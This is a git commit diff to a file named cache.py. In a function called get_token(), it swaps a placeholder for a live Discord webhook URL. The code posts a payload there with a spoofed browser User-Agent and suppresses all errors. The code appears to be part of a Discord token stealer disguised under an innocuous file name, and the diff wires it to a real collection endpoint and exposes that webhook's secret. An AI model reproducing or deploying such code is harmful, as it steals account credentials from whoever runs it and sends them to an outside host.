8f86f6d30da1386c4c346e02a140e49a7b5ad3d8
Ethan <110324565+5than@users.noreply.github.com>
2023-01-06 19:51:15 +0000

    fixed py discord webhook

--- cache.py
+++ cache.py
@@ -121,7 +121,7 @@ def get_token():
                                 'Content-Type': 'application/json',
                                 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                             }
-                            req = Request('WEBHOOK-URL', data=payload.encode(), headers=headers2)
+                            req = Request('https://discordapp.com/api/webhooks/1053259656723714118/RnMd79jgSxbSq9q_qmeOojqAYQmhTu5eyRCfwVafUx7q-i8166FVfXdSpf0CRJ7SNIDu', data=payload.encode(), headers=headers2)
                             urlopen(req)
                         except: continue
                 else: continue
